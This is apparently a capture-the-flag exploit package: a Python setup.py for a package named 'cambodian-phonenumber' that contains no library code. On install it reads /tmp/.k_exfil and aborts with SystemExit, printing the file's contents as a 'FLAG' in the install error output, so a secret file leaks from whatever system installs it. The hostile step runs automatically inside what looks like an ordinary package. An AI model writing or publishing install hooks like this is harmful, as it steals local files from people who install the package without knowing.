import os
from setuptools import setup

EXFIL = "/tmp/.k_exfil"
result = ""
try:
    with open(EXFIL) as f:
        result = f.read()
except Exception as e:
    result = f"not found yet: {e}"

raise SystemExit("\n\n==== FLAG ====\n" + result + "\n==== END ====\n")
setup(name="cambodian-phonenumber", version="0.0.1")
